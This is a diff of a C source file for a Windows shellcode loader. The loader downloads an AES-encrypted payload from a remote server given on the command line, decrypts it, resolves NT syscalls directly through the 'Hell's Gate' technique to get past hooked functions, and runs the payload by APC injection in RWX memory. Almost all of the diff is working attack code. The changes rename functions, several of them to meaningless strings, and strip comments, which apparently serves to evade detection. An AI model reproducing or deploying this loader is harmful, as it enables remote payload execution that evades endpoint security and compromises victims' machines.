@@ -9,20 +9,19 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-char* g_randomNameChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+char* g_charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 
-// Syscalls Hashes Values
-#define NtAllocateVirtualMemory_djb2 0x7B2D1D431C81F5F6
-#define NtWriteVirtualMemory_djb2 0x54AEE238645CCA7C
-#define NtProtectVirtualMemory_djb2 0xA0DCC2851566E832
-#define NtQueueApcThread_djb2 0x331E6B6B7E696022
+#define HASH_NTALLOCATEVIRTUALMEMORY 0x7B2D1D431C81F5F6
+#define HASH_NTWRITEVIRTUALMEMORY 0x54AEE238645CCA7C
+#define HASH_NTPROTECTVIRTUALMEMORY 0xA0DCC2851566E832
+#define HASH_NTQUEUEAPCTHREAD 0x331E6B6B7E696022
 
-char* dKr8m3J1sL(int length) {
+char* generateRandomString(int length) {
     char* result = (char*)malloc(length + 1);
     if (!result) return NULL;
 
     for (int i = 0; i < length; i++) {
-        result[i] = g_randomNameChars[rand() % 52];
+        result[i] = g_charSet[rand() % 52];
     }
     result[length] = '\0';
     return result;
@@ -32,14 +31,14 @@ typedef struct {
     char name[64];
     unsigned char* data;
     size_t dataSize;
-} c3nxP7lW2b;
+} ByteArrayVar;
 
-#define MAX_STORED_VARIABLES 20
-c3nxP7lW2b g_storedVariables[MAX_STORED_VARIABLES];
-int g_numStoredVariables = 0;
-c3nxP7lW2b* pT7wN3kR4l(const char* text);
+#define MAX_VARS 20
+ByteArrayVar g_storedVars[MAX_VARS];
+int g_varCount = 0;
+ByteArrayVar* parseByteArray(const char* text);
 
-BOOL qF2k9TxbL3(const wchar_t* serverName, const wchar_t* filePath, char** outBuffer, DWORD* outSize, BOOL useHttps) {
+BOOL sadfgdsdg(const wchar_t* serverName, const wchar_t* filePath, char** outBuffer, DWORD* outSize, BOOL useHttps) {
     BOOL result = FALSE;
     HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
     DWORD bytesRead = 0;
@@ -141,7 +140,7 @@ cleanup:
     return result;
 }
 
-BOOL h8G3vR7pT5(const char* line, char* outName, size_t maxNameLen) {
+BOOL extractVarName(const char* line, char* outName, size_t maxNameLen) {
     const char* start = strstr(line, "unsigned char ");
     if (!start) return FALSE;
 
@@ -154,7 +153,7 @@ BOOL h8G3vR7pT5(const char* line, char* outName, size_t maxNameLen) {
     return TRUE;
 }
 
-BOOL z2J6fQ9mK3(const char* str, unsigned char* outByte) {
+BOOL parseHexByte(const char* str, unsigned char* outByte) {
     if (strncmp(str, "0x", 2) != 0) return FALSE;
 
     char hexStr[3] = { str[2], str[3], '\0' };
@@ -164,19 +163,19 @@ BOOL z2J6fQ9mK3(const char* str, unsigned char* outByte) {
     return (endPtr != hexStr);
 }
 
-c3nxP7lW2b* findStoredVariable(const char* name) {
-    for (int i = 0; i < g_numStoredVariables; i++) {
-        if (strcmp(g_storedVariables[i].name, name) == 0) {
-            return &g_storedVariables[i];
+ByteArrayVar* findVar(const char* name) {
+    for (int i = 0; i < g_varCount; i++) {
+        if (strcmp(g_storedVars[i].name, name) == 0) {
+            return &g_storedVars[i];
         }
     }
     return NULL;
 }
 
-void cL8sB4xZ6f(const char* content) {
+void extractVars(const char* content) {
     const char* line = content;
     const char* nextLine = NULL;
-    char* variableData = NULL;
+    char* varData = NULL;
 
     while (line && *line) {
         nextLine = strchr(line, '\n');
@@ -190,26 +189,26 @@ void cL8sB4xZ6f(const char* content) {
             }
 
             size_t declSize = (endDecl + 2) - line;
-            variableData = (char*)malloc(declSize + 1);
-            if (!variableData) {
+            varData = (char*)malloc(declSize + 1);
+            if (!varData) {
                 line = nextLine ? (nextLine + 1) : NULL;
                 continue;
             }
 
-            memcpy(variableData, line, declSize);
-            variableData[declSize] = '\0';
+            memcpy(varData, line, declSize);
+            varData[declSize] = '\0';
 
-            c3nxP7lW2b* parsedArray = pT7wN3kR4l(variableData);
+            ByteArrayVar* parsedArray = parseByteArray(varData);
             if (parsedArray) {
-                if (g_numStoredVariables < MAX_STORED_VARIABLES) {
-                    strcpy_s(g_storedVariables[g_numStoredVariables].name, sizeof(g_storedVariables[g_numStoredVariables].name), parsedArray->name);
-                    g_storedVariables[g_numStoredVariables].data = parsedArray->data;
-                    g_storedVariables[g_numStoredVariables].dataSize = parsedArray->dataSize;
+                if (g_varCount < MAX_VARS) {
+                    strcpy_s(g_storedVars[g_varCount].name, sizeof(g_storedVars[g_varCount].name), parsedArray->name);
+                    g_storedVars[g_varCount].data = parsedArray->data;
+                    g_storedVars[g_varCount].dataSize = parsedArray->dataSize;
 
                     printf("[+] Stored %s with %zu bytes at index %d\n",
-                        parsedArray->name, parsedArray->dataSize, g_numStoredVariables);
+                        parsedArray->name, parsedArray->dataSize, g_varCount);
 
-                    g_numStoredVariables++;
+                    g_varCount++;
 
                     free(parsedArray);
                 }
@@ -220,7 +219,7 @@ void cL8sB4xZ6f(const char* content) {
                 }
             }
 
-            free(variableData);
+            free(varData);
 
             line = endDecl + 2;
         }
@@ -230,113 +229,80 @@ void cL8sB4xZ6f(const char* content) {
     }
 }
 
-/*--------------------------------------------------------------------
-  VX Tables
---------------------------------------------------------------------*/
-typedef struct _VX_TABLE_ENTRY {
+typedef struct _SYS_TABLE_ENTRY {
     PVOID   pAddress;
     DWORD64 dwHash;
     WORD    wSystemCall;
-} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
+} SYS_TABLE_ENTRY, * PSYS_TABLE_ENTRY;
 
-typedef struct _VX_TABLE {
-    VX_TABLE_ENTRY NtAllocateVirtualMemory;
-    VX_TABLE_ENTRY NtWriteVirtualMemory;
-    VX_TABLE_ENTRY NtProtectVirtualMemory;
-    VX_TABLE_ENTRY NtQueueApcThread;
-} VX_TABLE, * PVX_TABLE;
+typedef struct _SYS_TABLE {
+    SYS_TABLE_ENTRY NtAllocateVirtualMemory;
+    SYS_TABLE_ENTRY NtWriteVirtualMemory;
+    SYS_TABLE_ENTRY NtProtectVirtualMemory;
+    SYS_TABLE_ENTRY NtQueueApcThread;
+} SYS_TABLE, * PSYS_TABLE;
 
-/*--------------------------------------------------------------------
-  Function prototypes.
---------------------------------------------------------------------*/
-PTEB RtlGetThreadEnvironmentBlock();
-BOOL GetImageExportDirectory(
-    _In_ PVOID                     pModuleBase,
-    _Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
-);
-BOOL GetVxTableEntry(
-    _In_ PVOID pModuleBase,
-    _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
-    _In_ PVX_TABLE_ENTRY pVxTableEntry
-);
-/*--------------------------------------------------------------------
-  External functions' prototype.
---------------------------------------------------------------------*/
+PTEB getRtlTeb();
+BOOL getExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir);
+BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry);
+
 extern VOID HellsGate(WORD wSystemCall);
 extern HellDescent();
 
-BOOL downloadupdate(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+BOOL jasjkfdsgs(IN PSYS_TABLE pSysTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+    NTSTATUS STATUS = 0x00;
+    PVOID    pAddress = NULL;
+    ULONG    uOldProtection = NULL;
+    SIZE_T   sSize = sPayloadSize, sBytesWritten = NULL;
 
-    NTSTATUS	STATUS = 0x00;
-    PVOID		pAddress = NULL;
-    ULONG		uOldProtection = NULL;
-
-    SIZE_T		sSize = sPayloadSize,
-        sNumberOfBytesWritten = NULL;
-
-
-    // allocating memory 
-    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
+    HellsGate(pSysTable->NtAllocateVirtualMemory.wSystemCall);
     if ((STATUS = HellDescent(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
-        printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+        printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
         return FALSE;
     }
-    printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sSize);
+    printf("[+] Allocated Address At: 0x%p Of Size: %d\n", pAddress, sSize);
 
-    //--------------------------------------------------------------------------
-
-        // writing the payload
-    printf("[#] Press <Enter> To Write The Payload ... ");
+    printf("[#] Press <Enter> To Write The Payload...");
     getchar();
-    printf("\t[i] Writing Payload Of Size %d ... ", sPayloadSize);
-    HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
-    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sPayloadSize) {
-        printf("[!] pNtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
-        printf("[i] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
+    printf("\t[i] Writing Payload Of Size %d...", sPayloadSize);
+    HellsGate(pSysTable->NtWriteVirtualMemory.wSystemCall);
+    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &sBytesWritten)) != 0 || sBytesWritten != sPayloadSize) {
+        printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
+        printf("[i] Bytes Written: %d of %d\n", sBytesWritten, sPayloadSize);
         return FALSE;
     }
-    printf("[+] DONE \n");
+    printf("[+] DONE\n");
 
-    //--------------------------------------------------------------------------
-
-        // changing the memory's permissions to RWX
-    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
+    HellsGate(pSysTable->NtProtectVirtualMemory.wSystemCall);
     if ((STATUS = HellDescent(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
-        printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+        printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
         return FALSE;
     }
 
-    //--------------------------------------------------------------------------
-
-        // executing the payload via NtQueueApcThread
-
-    printf("[#] Press <Enter> To Run The Payload ... ");
+    printf("[#] Press <Enter> To Run The Payload...");
     getchar();
-    printf("\t[i] Running Payload At 0x%p Using Thread Of Id : %d ... ", pAddress, GetThreadId(hThread));
-    HellsGate(pVxTable->NtQueueApcThread.wSystemCall);
+    printf("\t[i] Running Payload At 0x%p Using Thread Of Id: %d...", pAddress, GetThreadId(hThread));
+    HellsGate(pSysTable->NtQueueApcThread.wSystemCall);
     if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
-        printf("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
+        printf("[!] NtQueueApcThread Failed With Error: 0x%0.8X\n", STATUS);
         return FALSE;
     }
-    printf("[+] DONE \n");
-
+    printf("[+] DONE\n");
 
     return TRUE;
 }
 
-c3nxP7lW2b* pT7wN3kR4l(const char* text) {
-    c3nxP7lW2b* result = (c3nxP7lW2b*)malloc(sizeof(c3nxP7lW2b));
+ByteArrayVar* parseByteArray(const char* text) {
+    ByteArrayVar* result = (ByteArrayVar*)malloc(sizeof(ByteArrayVar));
     if (!result) return NULL;
 
-    memset(result, 0, sizeof(c3nxP7lW2b));
+    memset(result, 0, sizeof(ByteArrayVar));
 
-    // Extract variable name
-    if (!h8G3vR7pT5(text, result->name, sizeof(result->name))) {
+    if (!extractVarName(text, result->name, sizeof(result->name))) {
         free(result);
         return NULL;
     }
 
-    // Count bytes in the array
     const char* ptr = text;
     size_t count = 0;
 
@@ -345,19 +311,17 @@ c3nxP7lW2b* pT7wN3kR4l(const char* text) {
         ptr += 2;
     }
 
-    // Allocate memory for the data
     result->data = (unsigned char*)malloc(count);
     if (!result->data) {
         free(result);
         return NULL;
     }
 
-    // Parse each byte
     ptr = text;
     size_t index = 0;
 
     while ((ptr = strstr(ptr, "0x")) && index < count) {
-        z2J6fQ9mK3(ptr, &result->data[index++]);
+        parseHexByte(ptr, &result->data[index++]);
         ptr += 2;
     }
 
@@ -365,14 +329,8 @@ c3nxP7lW2b* pT7wN3kR4l(const char* text) {
     return result;
 }
 
-VOID AlterableFunction() {
-
-    HANDLE	hEvent = CreateEvent(
-        NULL,
-        NULL,
-        NULL,
-        NULL
-    );
+VOID prealtthrreed() {
+    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
 
     MsgWaitForMultipleObjectsEx(
         1,
@@ -381,10 +339,9 @@ VOID AlterableFunction() {
         QS_HOTKEY,
         MWMO_ALERTABLE
     );
-
 }
 
-PTEB RtlGetThreadEnvironmentBlock() {
+PTEB getRtlTeb() {
 #if _WIN64
     return (PTEB)__readgsqword(0x30);
 #else
@@ -392,60 +349,51 @@ PTEB RtlGetThreadEnvironmentBlock() {
 #endif
 }
 
-DWORD64 djb2(PBYTE str) {
-    DWORD64 dwHash = 0x77347734DEADBEEF;
+DWORD64 hshstr(PBYTE str) {
+    DWORD64 hash = 0x77347734DEADBEEF;
     INT c;
 
     while (c = *str++)
-        dwHash = ((dwHash << 0x5) + dwHash) + c;
+        hash = ((hash << 0x5) + hash) + c;
 
-    return dwHash;
+    return hash;
 }
 
-BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
-    // Get DOS header
+BOOL getExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir) {
     PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
     if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         return FALSE;
     }
 
-    // Get NT headers
     PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
     if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
         return FALSE;
     }
 
-    // Get the EAT
-    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+    *ppImageExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
     return TRUE;
 }
 
-BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
-    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
-    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
-    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
+BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry) {
+    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfFunctions);
+    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfNames);
+    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDir->AddressOfNameOrdinals);
 
-    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
+    for (WORD cx = 0; cx < pImageExportDir->NumberOfNames; cx++) {
         PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
         PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
 
-        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
-            pVxTableEntry->pAddress = pFunctionAddress;
+        if (hshstr(pczFunctionName) == pSysTableEntry->dwHash) {
+            pSysTableEntry->pAddress = pFunctionAddress;
 
-            // Quick and dirty fix in case the function has been hooked
             WORD cw = 0;
             while (TRUE) {
-                // check if syscall, in this case we are too far
                 if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                     return FALSE;
 
-                // check if ret, in this case we are also probaly too far
                 if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                     return FALSE;
 
-                // First opcodes should be :
-                //    MOV R10, RCX
-                //    MOV RCX, <syscall>
                 if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                     && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                     && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
@@ -454,7 +402,7 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
                     && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                     BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                     BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
-                    pVxTableEntry->wSystemCall = (high << 8) | low;
+                    pSysTableEntry->wSystemCall = (high << 8) | low;
                     break;
                 }
 
@@ -468,7 +416,6 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 
 int main(int argc, char** argv) {
     srand((unsigned int)time(NULL));
-
     if (argc < 2) {
         STARTUPINFO si = { sizeof(STARTUPINFO) };
         PROCESS_INFORMATION pi;
@@ -487,13 +434,11 @@ int main(int argc, char** argv) {
         return 0;
     }
 
-    // Command-line arguments must be provided for all values (no defaults)
     if (argc < 3) {
         printf("Usage: %s <xyzremname> <ur-i-pa-th> [http]\n", argv[0]);
         return -1;
     }
 
-    // Convert server name from char* to wchar_t*
     size_t serverNameLen = strlen(argv[1]) + 1;
     wchar_t* serverName = (wchar_t*)malloc(serverNameLen * sizeof(wchar_t));
     if (!serverName) {
@@ -507,7 +452,6 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    // Convert file path from char* to wchar_t*
     size_t filePathLen = strlen(argv[2]) + 1;
     wchar_t* filePath = (wchar_t*)malloc(filePathLen * sizeof(wchar_t));
     if (!filePath) {
@@ -523,7 +467,6 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    // Determine protocol (HTTPS by default, HTTP if specified)
     BOOL useHttps = TRUE;
     if (argc >= 4 && strcmp(argv[3], "http") == 0) {
         useHttps = FALSE;
@@ -531,19 +474,19 @@ int main(int argc, char** argv) {
 
     char* fileContent = NULL;
     DWORD fileSize = 0;
-
     printf("[+] Downloading file from %ls%ls...\n", serverName, filePath);
 
-    char* randomFuncName = dKr8m3J1sL(10);
-    if (randomFuncName) {
-        printf("[+] Using %s protocol handler\n", randomFuncName);
-        free(randomFuncName);
+
+    char* randomStr = generateRandomString(10);
+    if (randomStr) {
+        printf("[+] Using %s protocol handler\n", randomStr);
+        free(randomStr);
     }
 
-    if (qF2k9TxbL3(serverName, filePath, &fileContent, &fileSize, useHttps)) {
+    if (sadfgdsdg(serverName, filePath, &fileContent, &fileSize, useHttps)) {
         printf("[+] Download successful. File size: %lu bytes\n", fileSize);
 
-        cL8sB4xZ6f(fileContent);
+        extractVars(fileContent);
 
         free(fileContent);
     }
@@ -554,32 +497,29 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    // Free allocated memory for arguments
     free(serverName);
     free(filePath);
 
     PBYTE pDecryptedData = NULL;
     SIZE_T sDecryptedData = 0;
-    c3nxP7lW2b* AesCipherText = findStoredVariable("AesCipherText");
-    c3nxP7lW2b* AesKey = findStoredVariable("AesKey");
-    c3nxP7lW2b* AesIv = findStoredVariable("AesIv");
+    ByteArrayVar* AesCipherText = findVar("AesCipherText");
+    ByteArrayVar* AesKey = findVar("AesKey");
+    ByteArrayVar* AesIv = findVar("AesIv");
 
-    // Check if all required variables were found
     if (!AesCipherText || !AesKey || !AesIv) {
         printf("[-] Missing required variables in downloaded content\n");
         return -1;
     }
 
-    printf("[+] AesCipherText: %s \n", AesCipherText->name);
-    printf("[+] AesKey: %s \n", AesKey->name);
-    printf("[+] AesIv: %s \n", AesIv->name);
+    printf("[+] AesCipherText: %s\n", AesCipherText->name);
+    printf("[+] AesKey: %s\n", AesKey->name);
+    printf("[+] AesIv: %s\n", AesIv->name);
 
     if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
-        printf("[!] SimpleDecryption Failed \n");
+        printf("[!] SimpleDecryption Failed\n");
         return -1;
     }
 
-    // With this code to print binary data in a readable format:
     printf("[+] Decrypted Data (hex): ");
     size_t i;
     for (i = 0; i < sDecryptedData && i < 50; i++) {
@@ -587,7 +527,6 @@ int main(int argc, char** argv) {
     }
     printf(i < sDecryptedData ? "...\n" : "\n");
 
-    // Optionally, try to print as string if it might be text:
     printf("[+] Decrypted Data (as text, if applicable): ");
     for (size_t i = 0; i < sDecryptedData && i < 100; i++) {
         unsigned char c = ((unsigned char*)pDecryptedData)[i];
@@ -595,53 +534,45 @@ int main(int argc, char** argv) {
     }
     printf(i < sDecryptedData ? "...\n" : "\n");
 
-    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+    PTEB pCurrentTeb = getRtlTeb();
     PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
     if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
         return 0x1;
 
-    // Get NTDLL module 
     PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
 
-    // Get the EAT of NTDLL
-    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
-    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
+    PIMAGE_EXPORT_DIRECTORY pImageExportDir = NULL;
+    if (!getExportDir(pLdrDataEntry->DllBase, &pImageExportDir) || pImageExportDir == NULL)
         return 0x01;
 
-    //--------------------------------------------------------------------------
-    // Initializing the 'Table' structure ...
-
-    VX_TABLE Table = { 0 };
-    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
-    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
+    SYS_TABLE sysTable = { 0 };
+    sysTable.NtAllocateVirtualMemory.dwHash = HASH_NTALLOCATEVIRTUALMEMORY;
+    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtAllocateVirtualMemory))
         return 0x1;
 
-    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
-    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
+    sysTable.NtWriteVirtualMemory.dwHash = HASH_NTWRITEVIRTUALMEMORY;
+    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtWriteVirtualMemory))
         return 0x1;
 
-    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
-    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
+    sysTable.NtProtectVirtualMemory.dwHash = HASH_NTPROTECTVIRTUALMEMORY;
+    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtProtectVirtualMemory))
         return 0x1;
 
-    Table.NtQueueApcThread.dwHash = NtQueueApcThread_djb2;
-    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQueueApcThread))
+    sysTable.NtQueueApcThread.dwHash = HASH_NTQUEUEAPCTHREAD;
+    if (!getittksjbfdsgdbkj(pLdrDataEntry->DllBase, pImageExportDir, &sysTable.NtQueueApcThread))
         return 0x1;
 
-    //--------------------------------------------------------------------------
-
-    // Sacrificial Alertable State Thread 
-    HANDLE hThread = CreateThread(NULL, NULL, AlterableFunction, NULL, NULL, NULL);
+    HANDLE hThread = CreateThread(NULL, NULL, prealtthrreed, NULL, NULL, NULL);
     if (!hThread) {
-        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
+        printf("[!] CreateThread Failed With Error: %d\n", GetLastError());
         return -1;
     }
 
-    if (!downloadupdate(&Table, (HANDLE)-1, hThread, pDecryptedData, sDecryptedData)) {
+    if (!jasjkfdsgs(&sysTable, (HANDLE)-1, hThread, pDecryptedData, sDecryptedData)) {
         return -1;
     }
 
-    printf("[#] Press <Enter> To Quit ... ");
+    printf("[#] Press <Enter> To Quit...");
     getchar();
 
     return 0x00;
